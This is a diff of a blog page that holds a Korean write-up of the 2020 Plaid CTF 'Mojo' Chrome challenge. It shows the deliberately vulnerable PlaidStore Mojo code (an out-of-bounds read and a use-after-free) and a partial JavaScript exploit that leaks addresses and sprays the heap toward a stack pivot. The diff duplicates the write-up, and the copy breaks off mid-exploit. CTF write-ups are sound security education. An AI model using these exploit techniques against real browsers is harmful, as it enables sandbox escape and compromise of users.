@@ -21,7 +21,7 @@
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2020-04-01T00:00:00+00:00" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","headline":"2020 Plaid CTF - Mojo","dateModified":"2020-04-01T00:00:00+00:00","datePublished":"2020-04-01T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020-04-01/Plaid-CTF-Mojo"},"author":{"@type":"Person","name":"nextline"},"url":"http://localhost:4000/2020-04-01/Plaid-CTF-Mojo","description":"라온화이트햇 핵심연구팀 이영주","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","headline":"2020 Plaid CTF - Mojo","dateModified":"2020-04-01T00:00:00+00:00","datePublished":"2020-04-01T00:00:00+00:00","author":{"@type":"Person","name":"nextline"},"url":"http://localhost:4000/2020-04-01/Plaid-CTF-Mojo","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020-04-01/Plaid-CTF-Mojo"},"description":"라온화이트햇 핵심연구팀 이영주","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -60,22 +60,22 @@
 
     <main>
       <div class="post"> 
-	<h1 class="post-title">2020 Plaid CTF - Mojo</h1>
-	<div class="post-line"></div>
+   <h1 class="post-title">2020 Plaid CTF - Mojo</h1>
+   <div class="post-line"></div>
 
-	
-		
-			
-				<span class="tag"><center><i>CTF</i></center></span>
-			
-		
-			
-				<span class="tag"><center><i>write-up</i></center></span>
-			
-		
-	
-
-	<p>라온화이트햇 핵심연구팀 이영주</p>
+   
+      
+         
+            <span class="tag"><center><i>CTF</i></center></span>
+         
+      
+         
+            <span class="tag"><center><i>write-up</i></center></span>
+         
+      
+   
+   
+   <p>라온화이트햇 핵심연구팀 이영주</p>
 
 <h1 id="1-vulnerability">1. Vulnerability</h1>
 
@@ -436,7 +436,369 @@ index e55e2d990da4..df6e6e62dbae 100644
 
 <p>위에서 시도한 방법 말고 여러 write-up에 좋은 exploit 방법들이 많으니 추가적으로 exploit에 대해 궁금한 점이 있다면 다른 문서들을 참고해 보는게 좋을 것 같다.</p>
 
-	</div>
+   
+   <p>라온화이트햇 핵심연구팀 이영주</p>
+
+<h1 id="1-vulnerability">1. Vulnerability</h1>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gd">--- /dev/null
+</span><span class="gi">+++ b/content/browser/plaidstore/plaidstore_impl.h
+</span><span class="p">@@ -0,0 +1,35 @@</span>
+<span class="gi">+#include &lt;string&gt;
++#include &lt;vector&gt;
++
++#include "third_party/blink/public/mojom/plaidstore/plaidstore.mojom.h"
++
++namespace content {
++
++class RenderFrameHost;
++
++class PlaidStoreImpl : public blink::mojom::PlaidStore {
++ public:
++  explicit PlaidStoreImpl(RenderFrameHost *render_frame_host);
++
++  static void Create(
++      RenderFrameHost* render_frame_host,
++      mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt; receiver);
++
++  ~PlaidStoreImpl() override;
++
++  // PlaidStore overrides:
++  void StoreData(
++      const std::string &amp;key,
++      const std::vector&lt;uint8_t&gt; &amp;data) override;
++
++  void GetData(
++      const std::string &amp;key,
++      uint32_t count,
++      GetDataCallback callback) override;
++
++ private:
++  RenderFrameHost* render_frame_host_;
++  std::map&lt;std::string, std::vector&lt;uint8_t&gt; &gt; data_store_;
++};
++
++} // namespace content
+</span>
+--- /dev/null
+<span class="gi">+++ b/content/browser/plaidstore/plaidstore_impl.cc
+</span><span class="p">@@ -0,0 +1,47 @@</span>
+<span class="gi">+#include "content/browser/plaidstore/plaidstore_impl.h"
++#include "content/public/browser/render_frame_host.h"
++#include "mojo/public/cpp/bindings/self_owned_receiver.h"
++
++namespace content {
++
++PlaidStoreImpl::PlaidStoreImpl(
++    RenderFrameHost *render_frame_host)
++    : render_frame_host_(render_frame_host) {}
++
++PlaidStoreImpl::~PlaidStoreImpl() {}
++
++void PlaidStoreImpl::StoreData(
++    const std::string &amp;key,
++    const std::vector&lt;uint8_t&gt; &amp;data) {
++  if (!render_frame_host_-&gt;IsRenderFrameLive()) {
++    return;
++  }
++  data_store_[key] = data;
++}
++
++void PlaidStoreImpl::GetData(
++    const std::string &amp;key,
++    uint32_t count,
++    GetDataCallback callback) {
++  if (!render_frame_host_-&gt;IsRenderFrameLive()) {
++    std::move(callback).Run({});
++    return;
++  }
++  auto it = data_store_.find(key);
++  if (it == data_store_.end()) {
++    std::move(callback).Run({});
++    return;
++  }
++  std::vector&lt;uint8_t&gt; result(it-&gt;second.begin(), it-&gt;second.begin() + count);
++  std::move(callback).Run(result);
++}
++
++// static
++void PlaidStoreImpl::Create(
++    RenderFrameHost *render_frame_host,
++    mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt; receiver) {
++  mojo::MakeSelfOwnedReceiver(std::make_unique&lt;PlaidStoreImpl&gt;(render_frame_host),
++                              std::move(receiver));
++}
++
++} // namespace content
+</span></code></pre></div></div>
+
+<p>제공된 파일중 diff 파일을 보면 Mojo IPC에서 사용할 수 있는 두개의 기능이 추가된것을 확인할 수 있다.</p>
+
+<h3 id="첫번째-취약점">첫번째 취약점</h3>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/mojo/public/js/mojo_bindings.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+	<span class="kd">let</span> <span class="nx">ptr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">PlaidStorePtr</span><span class="p">();</span>
+  <span class="nx">Mojo</span><span class="p">.</span><span class="nx">bindInterface</span><span class="p">(</span><span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">PlaidStore</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">mojo</span><span class="p">.</span><span class="nx">makeRequest</span><span class="p">(</span><span class="nx">p</span><span class="p">).</span><span class="nx">handle</span><span class="p">,</span> <span class="dl">"</span><span class="s2">context</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+	<span class="nx">ptr</span><span class="p">.</span><span class="nx">storeData</span><span class="p">(</span><span class="dl">"</span><span class="s2">key</span><span class="dl">"</span><span class="p">,</span> <span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+	<span class="nx">ptr</span><span class="p">.</span><span class="nx">getData</span><span class="p">();</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>기능을 사용할 때는 위와 같은 코드로 호출할 수 있다. PlaidStoreImpl::StoreData의 경우 key(std::string)와 data(std::vector<uint8_t>)를 인자로 받아 data_store_에 값을 저장하고 그 값을 PlaidStoreImpl::GetData에서 가져올 수 있는 구조이다.</uint8_t></p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">PlaidStoreImpl</span><span class="o">::</span><span class="n">GetData</span><span class="p">(</span>
+    <span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span>
+    <span class="kt">uint32_t</span> <span class="n">count</span><span class="p">,</span>
+    <span class="n">GetDataCallback</span> <span class="n">callback</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">render_frame_host_</span><span class="o">-&gt;</span><span class="n">IsRenderFrameLive</span><span class="p">())</span> <span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">move</span><span class="p">(</span><span class="n">callback</span><span class="p">).</span><span class="n">Run</span><span class="p">({});</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">auto</span> <span class="n">it</span> <span class="o">=</span> <span class="n">data_store_</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">it</span> <span class="o">==</span> <span class="n">data_store_</span><span class="p">.</span><span class="n">end</span><span class="p">())</span> <span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">move</span><span class="p">(</span><span class="n">callback</span><span class="p">).</span><span class="n">Run</span><span class="p">({});</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">uint8_t</span><span class="o">&gt;</span> <span class="n">result</span><span class="p">(</span><span class="n">it</span><span class="o">-&gt;</span><span class="n">second</span><span class="p">.</span><span class="n">begin</span><span class="p">(),</span> <span class="n">it</span><span class="o">-&gt;</span><span class="n">second</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span> <span class="o">+</span> <span class="n">count</span><span class="p">);</span>
+  <span class="n">std</span><span class="o">::</span><span class="n">move</span><span class="p">(</span><span class="n">callback</span><span class="p">).</span><span class="n">Run</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>첫번째 취약점은 GetData 함수에 있다. GetData 함수는 인자로 key, count를 받는데 count에 대한 범위 검사가 존재하지 않는다. 따라서 원하는 만큼 메모리를 읽어 반환할 수 있다.</p>
+
+<p><img src="/assets/7bacb2f1-3ed4-480e-b685-34eecdee7029/f3659752-c967-4a31-85d6-02b115109455.png" alt="/assets/7bacb2f1-3ed4-480e-b685-34eecdee7029/f3659752-c967-4a31-85d6-02b115109455.png" /></p>
+
+<p>data_store_에서 65(A), 66(B)이 있는 사이즈 16의 vector를 저장하고 취약점을 트리거해서 뒤에 메모리까지 읽은 모습이다.</p>
+
+<h3 id="두번째-취약점">두번째 취약점</h3>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gd">--- a/content/browser/browser_interface_binders.cc
+</span><span class="gi">+++ b/content/browser/browser_interface_binders.cc
+</span><span class="p">@@ -86,6 +86,7 @@</span>
+ #include "third_party/blink/public/mojom/payments/payment_app.mojom.h"
+ #include "third_party/blink/public/mojom/permissions/permission.mojom.h"
+ #include "third_party/blink/public/mojom/picture_in_picture/picture_in_picture.mojom.h"
+<span class="gi">+#include "third_party/blink/public/mojom/plaidstore/plaidstore.mojom.h"
+</span> #include "third_party/blink/public/mojom/presentation/presentation.mojom.h"
+ #include "third_party/blink/public/mojom/quota/quota_dispatcher_host.mojom.h"
+ #include "third_party/blink/public/mojom/sms/sms_receiver.mojom.h"
+<span class="p">@@ -109,6 +110,7 @@</span>
+ #include "third_party/blink/public/mojom/serial/serial.mojom.h"
+ #endif
+ 
+<span class="gi">+
+</span> #if defined(OS_ANDROID)
+ #include "content/browser/android/date_time_chooser_android.h"
+ #include "content/browser/android/text_suggestion_host_android.h"
+<span class="p">@@ -660,6 +662,10 @@</span> void PopulateFrameBinders(RenderFrameHostImpl* host,
+   map-&gt;Add&lt;blink::mojom::SerialService&gt;(base::BindRepeating(
+       &amp;RenderFrameHostImpl::BindSerialService, base::Unretained(host)));
+ #endif  // !defined(OS_ANDROID)
+<span class="gi">+
++  map-&gt;Add&lt;blink::mojom::PlaidStore&gt;(
++      base::BindRepeating(&amp;RenderFrameHostImpl::CreatePlaidStore,
++                          base::Unretained(host)));
+</span> }
+ 
+ void PopulateBinderMapWithContext(
+<span class="gh">diff --git a/content/browser/frame_host/render_frame_host_impl.cc b/content/browser/frame_host/render_frame_host_impl.cc
+index e55e2d990da4..df6e6e62dbae 100644
+</span><span class="gd">--- a/content/browser/frame_host/render_frame_host_impl.cc
+</span><span class="gi">+++ b/content/browser/frame_host/render_frame_host_impl.cc
+</span><span class="p">@@ -80,6 +80,7 @@</span>
+ #include "content/browser/permissions/permission_controller_impl.h"
+ #include "content/browser/permissions/permission_service_context.h"
+ #include "content/browser/permissions/permission_service_impl.h"
+<span class="gi">+#include "content/browser/plaidstore/plaidstore_impl.h"
+</span> #include "content/browser/portal/portal.h"
+ #include "content/browser/presentation/presentation_service_impl.h"
+ #include "content/browser/push_messaging/push_messaging_manager.h"
+<span class="p">@@ -6619,6 +6620,11 @@</span> void RenderFrameHostImpl::CreateInstalledAppProvider(
+   InstalledAppProviderImpl::Create(this, std::move(receiver));
+ }
+ 
+<span class="gi">+void RenderFrameHostImpl::CreatePlaidStore(
++    mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt; receiver) {
++  PlaidStoreImpl::Create(this, std::move(receiver));
++}
++
+</span></code></pre></div></div>
+
+<p>두번째 취약점은 RenderFrameHost의 lifetime때문에 발생한다. RenderFrameHost란 브라우저에서 frame을 나타낸다.</p>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gi">+
++  map-&gt;Add&lt;blink::mojom::PlaidStore&gt;(
++      base::BindRepeating(&amp;RenderFrameHostImpl::CreatePlaidStore,
++                          base::Unretained(host)));
+</span></code></pre></div></div>
+
+<p>RenderFrameHostImpl::CreatePlaidStore를 바인딩할 때, 인자인 host(content::RenderFrameHost)를 pointer(base::Unretained)로 전달한다.</p>
+
+<blockquote>
+  <p>base::Unretained() - disables the refcounting of member function receiver objects (which may not be of refcounted types) and the COMPILE_ASSERT on function arguments. Use with care, since it implies you need to make sure the lifetime of the object lasts beyond when the callback can be invoked. For the member function receiver object, it’s probably better to use a base::WeakPtr instead.</p>
+</blockquote>
+
+<p>이 <a href="https://www.chromium.org/developers/coding-style/important-abstractions-and-data-structures">링크</a>에 따르면 base::Unretained()은 refcounting을 비활성화한 pointer를 처리할때 사용한다. 크롬에서 대부분의 객체들은 스마트 포인터에 의해 수명이 관리되는데 저 태그를 통해 인자를 전달하는 경우 refcounted 객체가 아닌 raw pointer 그대로 전달하게 된다.
+따라서 PlaidStoreImpl는 RenderFrameHost 객체를 raw pointer로 가지고 있고, 서비스보다 host 객체가 더 빨리 해제된 상태에서 PlaidStoreImpl 함수들을 호출하면 use-after-free 취약점이 발생하게 된다.</p>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gi">+void PlaidStoreImpl::StoreData(
++    const std::string &amp;key,
++    const std::vector&lt;uint8_t&gt; &amp;data) {
++  if (!render_frame_host_-&gt;IsRenderFrameLive()) {
++    return;
++  }
+</span><span class="err">...</span>
++void PlaidStoreImpl::GetData(
+<span class="gi">+    const std::string &amp;key,
++    uint32_t count,
++    GetDataCallback callback) {
++  if (!render_frame_host_-&gt;IsRenderFrameLive()) {
++    std::move(callback).Run({});
++    return;
++  }
+</span></code></pre></div></div>
+
+<p>UAF 취약점이 발생하게 되면, storeData와 getData 함수를 호출할 때 render_frame_host_가 free된 pointer이다. 그래서 <code class="highlighter-rouge">render_frame_host_-&gt;IsRenderFrameLive()</code> 함수를 호출할 때 크래시가 발생한다.</p>
+
+<p><img src="/assets/0350c1e2-6822-4c6e-ae56-7aa843a72534/32e97a92-7980-40d2-809d-85883f145779.png" alt="/assets/0350c1e2-6822-4c6e-ae56-7aa843a72534/32e97a92-7980-40d2-809d-85883f145779.png" /></p>
+
+<p>취약점을 트리거 하면 위와같은 모습이다. <code class="highlighter-rouge">call qword ptr [rax + 0x160]</code> 에서 크래시가 발생하며 rax가 이상한 값으로 덮혀있는 것을 확인할 수 있다.</p>
+
+<h1 id="2-exploit">2. Exploit</h1>
+
+<p>exploit은 여러가지 방법으로 시도할 수 있다. 시도한 방법은 아래와 같다.</p>
+
+<ol>
+  <li>memory leak 취약점을 이용해 chrome binary base를 구한다. (pie 우회)</li>
+  <li>원하는 값이 있고 주소를 아는 heap 메모리를 만든다. (rop chain 구성을 위해서)</li>
+  <li>spray를 통해 rax를 heap 메모리로 변경한다.</li>
+  <li>push rax; pop rsp; ret 가젯을 통해 스택을 피벗한다.</li>
+  <li>flag를 읽는다.</li>
+</ol>
+
+<h3 id="1-chrome-binary-base-주소-구하기">1. chrome binary base 주소 구하기</h3>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">leak_pie</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">ptr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">PlaidStorePtr</span><span class="p">()</span>
+    <span class="nx">Mojo</span><span class="p">.</span><span class="nx">bindInterface</span><span class="p">(</span><span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">PlaidStore</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">mojo</span><span class="p">.</span><span class="nx">makeRequest</span><span class="p">(</span><span class="nx">ptr</span><span class="p">).</span><span class="nx">handle</span> <span class="p">,</span> <span class="dl">'</span><span class="s1">context</span><span class="dl">'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+
+    <span class="kd">var</span> <span class="nx">spr</span> <span class="o">=</span> <span class="p">[];</span>
+	  <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="mh">0x1</span><span class="p">);</span>
+	  <span class="nx">arr</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mh">0x47</span><span class="p">);</span>
+	  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+	      <span class="nx">spr</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">PlaidStorePtr</span><span class="p">())</span>
+	      <span class="nx">Mojo</span><span class="p">.</span><span class="nx">bindInterface</span><span class="p">(</span><span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">PlaidStore</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">mojo</span><span class="p">.</span><span class="nx">makeRequest</span><span class="p">(</span><span class="nx">spr</span><span class="p">[</span><span class="nx">i</span><span class="p">]).</span><span class="nx">handle</span> <span class="p">,</span> <span class="dl">'</span><span class="s1">context</span><span class="dl">'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+	      <span class="nx">spr</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">storeData</span><span class="p">(</span><span class="dl">'</span><span class="s1">key</span><span class="dl">'</span><span class="p">,</span> <span class="nx">arr</span><span class="p">);</span>
+	  <span class="p">}</span>
+	  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+	      <span class="nx">spr</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">ptr</span><span class="p">.</span><span class="nx">reset</span><span class="p">();</span>
+	  <span class="p">}</span>
+
+    <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>
+    <span class="nx">ptr</span><span class="p">.</span><span class="nx">storeData</span><span class="p">(</span><span class="dl">"</span><span class="s2">key</span><span class="dl">"</span><span class="p">,</span> <span class="nx">arr</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">tmp</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">ptr</span><span class="p">.</span><span class="nx">getData</span><span class="p">(</span><span class="dl">"</span><span class="s2">key</span><span class="dl">"</span><span class="p">,</span> <span class="mi">1000000</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">tmp2</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">tmp</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">tmp3</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">tmp2</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
+
+    <span class="c1">// find pie</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">((</span><span class="nx">tmp3</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x0fff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x9d0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">pie</span> <span class="o">=</span> <span class="p">(</span><span class="nx">tmp3</span><span class="p">[</span><span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x100000000</span><span class="p">)</span> <span class="o">+</span> <span class="nx">tmp3</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2d5f9d0</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">pie</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p>PlaidStoreImpl 객체 안에는 vtable처럼 chrome binary base 주소를 알아낼 수 있는 값이 존재한다. 따라서 PlaidStoreImpl를 할당받고 free한 뒤에 비슷한 크기로 chunk를 할당받아 그 위치부터 힙을 읽다 보면 환경에 상관없이 항상 binary base를 구할 수 있었다.</p>
+
+<h3 id="2-원하는-값이-있는-memory-주소-구하기">2. 원하는 값이 있는 memory 주소 구하기</h3>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">leak_string</span><span class="p">()</span> <span class="p">{</span>
+      <span class="nx">ptr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">PlaidStorePtr</span><span class="p">()</span>
+      <span class="nx">Mojo</span><span class="p">.</span><span class="nx">bindInterface</span><span class="p">(</span><span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">PlaidStore</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">mojo</span><span class="p">.</span><span class="nx">makeRequest</span><span class="p">(</span><span class="nx">ptr</span><span class="p">).</span><span class="nx">handle</span> <span class="p">,</span> <span class="dl">'</span><span class="s1">context</span><span class="dl">'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+
+      <span class="kd">var</span> <span class="nx">spr</span> <span class="o">=</span> <span class="p">[];</span>
+      <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="mh">0x500</span><span class="p">);</span>
+      <span class="nx">arr</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mh">0x0</span><span class="p">);</span>
+      <span class="kd">var</span> <span class="nx">str</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/flag_printer</span><span class="dl">"</span><span class="p">;</span>
+      <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span><span class="o">&lt;</span><span class="nx">str</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">arr</span><span class="p">[</span><span class="mh">0x10</span><span class="o">+</span><span class="nx">j</span><span class="p">]</span> <span class="o">=</span> <span class="nx">str</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">j</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">spr</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">PlaidStorePtr</span><span class="p">())</span>
+          <span class="nx">Mojo</span><span class="p">.</span><span class="nx">bindInterface</span><span class="p">(</span><span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">PlaidStore</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">mojo</span><span class="p">.</span><span class="nx">makeRequest</span><span class="p">(</span><span class="nx">spr</span><span class="p">[</span><span class="nx">i</span><span class="p">]).</span><span class="nx">handle</span> <span class="p">,</span> <span class="dl">'</span><span class="s1">context</span><span class="dl">'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+          <span class="nx">spr</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">storeData</span><span class="p">(</span><span class="dl">'</span><span class="s1">key</span><span class="dl">'</span><span class="p">,</span> <span class="nx">arr</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">spr</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">ptr</span><span class="p">.</span><span class="nx">reset</span><span class="p">();</span>
+      <span class="p">}</span>
+
+      <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="mh">0x48</span><span class="p">);</span>
+      <span class="nx">ptr</span><span class="p">.</span><span class="nx">storeData</span><span class="p">(</span><span class="dl">"</span><span class="s2">key3</span><span class="dl">"</span><span class="p">,</span> <span class="nx">arr</span><span class="p">);</span>
+      <span class="nx">tmp</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">ptr</span><span class="p">.</span><span class="nx">getData</span><span class="p">(</span><span class="dl">"</span><span class="s2">key3</span><span class="dl">"</span><span class="p">,</span> <span class="mi">1000000</span><span class="p">);</span>
+      <span class="nx">tmp2</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">tmp</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+      <span class="nx">tmp3</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">tmp2</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
+
+      <span class="c1">// find heap</span>
+      <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+          <span class="k">if</span> <span class="p">((</span><span class="nx">tmp3</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">tmp3</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+              <span class="k">if</span> <span class="p">(</span><span class="nx">tmp3</span><span class="p">[</span><span class="nx">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="nx">tmp3</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x500</span><span class="p">))</span> <span class="p">{</span>
+                  <span class="nx">stradd</span> <span class="o">=</span> <span class="nx">tmp3</span><span class="p">[</span><span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x100000000</span><span class="p">)</span> <span class="o">+</span> <span class="nx">tmp3</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+              <span class="p">}</span>
+          <span class="p">}</span>
+          <span class="k">if</span> <span class="p">(</span><span class="nx">stradd</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+              <span class="k">break</span><span class="p">;</span>
+          <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
